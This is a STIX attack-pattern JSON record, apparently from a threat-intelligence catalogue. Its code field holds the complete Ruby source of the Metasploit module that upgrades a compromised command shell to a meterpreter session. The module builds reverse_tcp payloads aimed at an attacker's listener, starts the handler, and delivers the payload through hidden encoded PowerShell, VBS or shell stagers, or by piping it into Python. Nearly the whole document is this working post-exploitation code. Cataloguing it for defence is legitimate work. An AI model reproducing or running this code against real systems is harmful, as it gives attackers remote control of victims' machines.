{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--84559b7b-ece7-426f-98bd-116eb1555f51",
    "created": "2024-08-14T16:33:18.003079Z",
    "modified": "2024-08-14T16:33:18.003083Z",
    "name": "Shell to Meterpreter Upgrade",
    "description": " This module attempts to upgrade a command shell to meterpreter. The shell platform is automatically detected and the best version of meterpreter for the target is selected. Currently meterpreter/reverse_tcp is used on Windows and Linux, with 'python/meterpreter/reverse_tcp' used on all others.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/manage/shell_to_meterpreter.rb",
            "external_id": "shell_to_meterpreter.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'rex/exploitation/cmdstager'\n\nclass MetasploitModule < Msf::Post\n  include Exploit::Powershell\n  include Post::Architecture\n  include Post::Windows::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Shell to Meterpreter Upgrade',\n        'Description' => %q{\n          This module attempts to upgrade a command shell to meterpreter. The shell\n          platform is automatically detected and the best version of meterpreter for\n          the target is selected. Currently meterpreter/reverse_tcp is used on Windows\n          and Linux, with 'python/meterpreter/reverse_tcp' used on all others.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Tom Sellers <tom [at] fadedcode.net>'],\n        'Platform' => [ 'linux', 'osx', 'unix', 'solaris', 'bsd', 'windows' ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ]\n      )\n    )\n    register_options(\n      [\n        OptAddressLocal.new('LHOST',\n                            [false, 'IP of host that will receive the connection from the payload (Will try to auto detect).', nil]),\n        OptInt.new('LPORT',\n                   [true, 'Port for payload to connect to.', 4433]),\n        OptBool.new('HANDLER',\n                    [ true, 'Start an exploit/multi/handler to receive the connection', true])\n      ]\n    )\n    register_advanced_options([\n      OptInt.new('HANDLE_TIMEOUT',\n                 [true, 'How long to wait (in seconds) for the session to come back.', 30]),\n      OptEnum.new('WIN_TRANSFER',\n                  [true, 'Which method to try first to transfer files on a Windows target.', 'POWERSHELL', ['POWERSHELL', 'VBS']]),\n      OptString.new('PAYLOAD_OVERRIDE',\n                    [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil]),\n      OptString.new('BOURNE_PATH',\n                    [false, 'Remote path to drop binary']),\n      OptString.new('BOURNE_FILE',\n                    [false, 'Remote filename to use for dropped binary']),\n      OptInt.new('COMMAND_TIMEOUT',\n                 [true, 'How long to wait (in seconds) for a result when executing a command on the remote machine.', 15]),\n    ])\n    deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')\n  end\n\n  def command_timeout\n    datastore['COMMAND_TIMEOUT']\n  end\n\n  # Run method for when run command is issued\n  def run\n    print_status(\"Upgrading session ID: #{datastore['SESSION']}\")\n\n    # Try hard to find a valid LHOST value in order to\n    # make running 'sessions -u' as robust as possible.\n    if datastore['LHOST']\n      lhost = datastore['LHOST']\n    elsif framework.datastore['LHOST']\n      lhost = framework.datastore['LHOST']\n    else\n      lhost = session.tunnel_local.split(':')[0]\n      if lhost == 'Local Pipe'\n        print_error 'LHOST is \"Local Pipe\", please manually set the correct IP.'\n        return\n      end\n    end\n\n    # If nothing else works...\n    lhost = Rex::Socket.source_address if lhost.blank?\n\n    lport = datastore['LPORT']\n\n    # Handle platform specific variables and settings\n    case session.platform\n    when 'windows', 'win'\n      platform = 'windows'\n      lplat = [Msf::Platform::Windows]\n      arch = get_os_architecture\n      case arch\n      when ARCH_X64\n        payload_name = 'windows/x64/meterpreter/reverse_tcp'\n        psh_arch = 'x64'\n      when ARCH_X86\n        payload_name = 'windows/meterpreter/reverse_tcp'\n        psh_arch = 'x86'\n      else\n        print_error('Target is running Windows on an unsupported architecture such as Windows ARM!')\n        return nil\n      end\n      larch = [arch]\n      vprint_status('Platform: Windows')\n    when 'osx'\n      platform = 'osx'\n      payload_name = 'osx/x64/meterpreter/reverse_tcp'\n      lplat = [Msf::Platform::OSX]\n      larch = [ARCH_X64]\n      vprint_status('Platform: OS X')\n    when 'solaris'\n      platform = 'python'\n      payload_name = 'python/meterpreter/reverse_tcp'\n      vprint_status('Platform: Solaris')\n    else\n      # Find the best fit, be specific with uname to avoid matching hostname or something else\n      target_info = cmd_exec('uname -ms')\n      if target_info =~ /linux/i && target_info =~ /86/\n        # Handle linux shells that were identified as 'unix'\n        platform = 'linux'\n        payload_name = 'linux/x86/meterpreter/reverse_tcp'\n        lplat = [Msf::Platform::Linux]\n        larch = [ARCH_X86]\n        vprint_status('Platform: Linux')\n      elsif target_info =~ /darwin/i\n        platform = 'osx'\n        payload_name = 'osx/x64/meterpreter/reverse_tcp'\n        lplat = [Msf::Platform::OSX]\n        larch = [ARCH_X64]\n        vprint_status('Platform: OS X')\n      elsif remote_python_binary\n        # Generic fallback for OSX, Solaris, Linux/ARM\n        platform = 'python'\n        payload_name = 'python/meterpreter/reverse_tcp'\n        vprint_status('Platform: Python [fallback]')\n      end\n    end\n\n    if platform.blank?\n      print_error(\"Shells on the target platform, #{session.platform}, cannot be upgraded to Meterpreter at this time.\")\n      return nil\n    end\n\n    payload_name = datastore['PAYLOAD_OVERRIDE'] if datastore['PAYLOAD_OVERRIDE']\n\n    vprint_status(\"Upgrade payload: #{payload_name}\")\n\n    payload_data = generate_payload(lhost, lport, payload_name)\n    if payload_data.blank?\n      print_error(\"Unable to build a suitable payload for #{session.platform} using payload #{payload_name}.\")\n      return nil\n    end\n\n    if datastore['HANDLER']\n      listener_job_id = create_multihandler(lhost, lport, payload_name)\n      if listener_job_id.blank?\n        print_error(\"Failed to start exploit/multi/handler on #{datastore['LPORT']}, it may be in use by another process.\")\n        return nil\n      end\n    end\n\n    case platform\n    when 'windows'\n      if session.type == 'powershell'\n        template_path = Rex::Powershell::Templates::TEMPLATE_DIR\n        psh_payload = case datastore['Powershell::method']\n                      when 'net'\n                        Rex::Powershell::Payload.to_win32pe_psh_net(template_path, payload_data)\n                      when 'reflection'\n                        Rex::Powershell::Payload.to_win32pe_psh_reflection(template_path, payload_data)\n                      when 'old'\n                        Rex::Powershell::Payload.to_win32pe_psh(template_path, payload_data)\n                      when 'msil'\n                        raise 'MSIL Powershell method no longer exists'\n                      else\n                        raise 'No Powershell method specified'\n                      end\n\n        # prepend_sleep => 1\n        psh_payload = 'Start-Sleep -s 1;' << psh_payload\n\n        encoded_psh_payload = encode_script(psh_payload)\n        cmd_exec(run_hidden_psh(encoded_psh_payload, psh_arch, true))\n      elsif have_powershell? && (datastore['WIN_TRANSFER'] != 'VBS')\n        vprint_status('Transfer method: Powershell')\n        psh_opts = { persist: false, prepend_sleep: 1 }\n        if session.type == 'shell'\n          cmd_exec(\"echo. | #{cmd_psh_payload(payload_data, psh_arch, psh_opts)}\")\n        else\n          psh_opts[:remove_comspec] = true\n          cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts), nil, command_timeout, { 'Channelized' => false })\n        end\n      else\n        print_error('Powershell is not installed on the target.') if datastore['WIN_TRANSFER'] == 'POWERSHELL'\n        vprint_status('Transfer method: VBS [fallback]')\n        exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)\n        aborted = transmit_payload(exe, platform)\n      end\n    when 'python'\n      vprint_status('Transfer method: Python')\n      cmd_exec(\"echo \\\"#{payload_data}\\\" | #{remote_python_binary}\", nil, command_timeout, { 'Channelized' => false })\n    when 'osx'\n      vprint_status('Transfer method: Python [OSX]')\n      payload_data = Msf::Util::EXE.to_python_reflection(framework, ARCH_X64, payload_data, {})\n      cmd_exec(\"echo \\\"#{payload_data}\\\" | #{remote_python_binary} & disown\", nil, command_timeout, { 'Channelized' => false })\n    else\n      vprint_status('Transfer method: Bourne shell [fallback]')\n      exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)\n      aborted = transmit_payload(exe, platform)\n    end\n\n    if datastore['HANDLER']\n      vprint_status('Cleaning up handler')\n      cleanup_handler(listener_job_id, aborted)\n    end\n\n    nil\n  end\n\n  #\n  # Get the Python binary from the remote machine, if any, by running\n  # a series of channelized `cmd_exec` calls.\n  # @return String/nil A string if a Python binary can be found, else nil.\n  #\n  def remote_python_binary\n    return @remote_python_binary if defined?(@remote_python_binary)\n\n    python_exists_regex = /Python (2|3)\\.(\\d)/\n\n    if cmd_exec('python3 -V 2>&1') =~ python_exists_regex\n      @remote_python_binary = 'python3'\n    elsif cmd_exec('python -V 2>&1') =~ python_exists_regex\n      @remote_python_binary = 'python'\n    elsif cmd_exec('python2 -V 2>&1') =~ python_exists_regex\n      @remote_python_binary = 'python2'\n    else\n      @remote_python_binary = nil\n    end\n\n    @remote_python_binary\n  end\n\n  def transmit_payload(exe, platform)\n    #\n    # Generate the stager command array\n    #\n    linemax = 1700\n    if session.exploit_datastore['LineMax']\n      linemax = session.exploit_datastore['LineMax'].to_i\n    end\n    opts = {\n      linemax: linemax\n      # :nodelete => true # keep temp files (for debugging)\n    }\n    case platform\n    when 'windows'\n      opts[:decoder] = File.join(Rex::Exploitation::DATA_DIR, 'exploits', 'cmdstager', 'vbs_b64')\n      cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)\n    when 'osx'\n      opts[:background] = true\n      cmdstager = Rex::Exploitation::CmdStagerPrintf.new(exe)\n    else\n      opts[:background] = true\n      opts[:temp] = datastore['BOURNE_PATH']\n      opts[:file] = datastore['BOURNE_FILE']\n      cmdstager = Rex::Exploitation::CmdStagerBourne.new(exe)\n    end\n\n    cmds = cmdstager.generate(opts)\n    if cmds.nil? || cmds.empty?\n      print_error('The command stager could not be generated.')\n      raise ArgumentError\n    end\n\n    #\n    # Calculate the total size\n    #\n    total_bytes = 0\n    cmds.each { |cmd| total_bytes += cmd.length }\n\n    vprint_status('Starting transfer...')\n    begin\n      #\n      # Run the commands one at a time\n      #\n      sent = 0\n      aborted = false\n      cmds.each.with_index do |cmd, i|\n        # The last command should be fire-and-forget, otherwise issues occur where the original session waits\n        # for an unlimited amount of time for the newly spawned session to exit.\n        wait_for_cmd_result = i + 1 < cmds.length\n        # Note that non-channelized cmd_exec calls currently return an empty string\n        ret = cmd_exec(cmd, nil, command_timeout, { 'Channelized' => wait_for_cmd_result })\n        if wait_for_cmd_result\n          if !ret\n            aborted = true\n          else\n            ret.strip!\n            aborted = true if !ret.empty? && ret !~ /The process tried to write to a nonexistent pipe./\n          end\n          if aborted\n            print_error('Error: Unable to execute the following command: ' + cmd.inspect)\n            print_error('Output: ' + ret.inspect) if ret && !ret.empty?\n            break\n          end\n        end\n\n        sent += cmd.length\n        progress(total_bytes, sent)\n      end\n    rescue ::Interrupt\n      # TODO: cleanup partial uploads!\n      aborted = true\n    rescue StandardError => e\n      print_error(\"Error: #{e}\")\n      aborted = true\n    end\n\n    return aborted\n  end\n\n  def cleanup_handler(listener_job_id, aborted)\n    # Return if the job has already finished\n    return nil if framework.jobs[listener_job_id].nil?\n\n    framework.threads.spawn('ShellToMeterpreterUpgradeCleanup', false) do\n      if !aborted\n        timer = 0\n        timeout = datastore['HANDLE_TIMEOUT']\n        vprint_status(\"Waiting up to #{timeout} seconds for the session to come back\")\n        while !framework.jobs[listener_job_id].nil? && timer < timeout\n          sleep(1)\n          timer += 1\n        end\n      end\n      print_status('Stopping exploit/multi/handler')\n      framework.jobs.stop_job(listener_job_id)\n    end\n  end\n\n  #\n  # Show the progress of the upload\n  #\n  def progress(total, sent)\n    done = (sent.to_f / total.to_f) * 100\n    print_status(format('Command stager progress: %3.2f%% (%d/%d bytes)', done.to_f, sent, total))\n  end\n\n  # Method for checking if a listener for a given IP and port is present\n  # will return true if a conflict exists and false if none is found\n  def check_for_listener(lhost, lport)\n    client.framework.jobs.each do |_k, j|\n      next unless j.name =~ %r{ multi/handler}\n\n      current_id = j.jid\n      current_lhost = j.ctx[0].datastore['LHOST']\n      current_lport = j.ctx[0].datastore['LPORT']\n      if lhost == current_lhost && lport == current_lport.to_i\n        print_error(\"Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}\")\n        return true\n      end\n    end\n    return false\n  end\n\n  # Starts a exploit/multi/handler session\n  def create_multihandler(lhost, lport, payload_name)\n    pay = client.framework.payloads.create(payload_name)\n    pay.datastore['RHOST'] = rhost\n    pay.datastore['LHOST'] = lhost\n    pay.datastore['LPORT'] = lport\n\n    print_status('Starting exploit/multi/handler')\n\n    if check_for_listener(lhost, lport)\n      print_error('A job is listening on the same local port')\n      return\n    end\n\n    # Set options for module\n    mh = client.framework.exploits.create('multi/handler')\n    mh.share_datastore(pay.datastore)\n    mh.datastore['WORKSPACE'] = client.workspace\n    mh.datastore['PAYLOAD'] = payload_name\n    mh.datastore['EXITFUNC'] = 'thread'\n    mh.datastore['ExitOnSession'] = true\n    # Validate module options\n    mh.options.validate(mh.datastore)\n    # Execute showing output\n    mh.exploit_simple(\n      'Payload' => mh.datastore['PAYLOAD'],\n      'LocalInput' => user_input,\n      'LocalOutput' => user_output,\n      'RunAsJob' => true\n    )\n\n    # Check to make sure that the handler is actually valid\n    # If another process has the port open, then the handler will fail\n    # but it takes a few seconds to do so.  The module needs to give\n    # the handler time to fail or the resulting connections from the\n    # target could end up on on a different handler with the wrong payload\n    # or dropped entirely.\n    select(nil, nil, nil, 5)\n    return nil if framework.jobs[mh.job_id.to_s].nil?\n\n    mh.job_id.to_s\n  end\n\n  def generate_payload(lhost, lport, payload_name)\n    payload = framework.payloads.create(payload_name)\n\n    unless payload.respond_to?('generate_simple')\n      print_error(\"Could not generate payload #{payload_name}. Invalid payload?\")\n      return\n    end\n\n    options = \"LHOST=#{lhost} LPORT=#{lport} RHOST=#{rhost}\"\n    payload.generate_simple('OptionStr' => options)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'linux', 'osx', 'unix', 'solaris', 'bsd', 'windows' ]"
    ]
}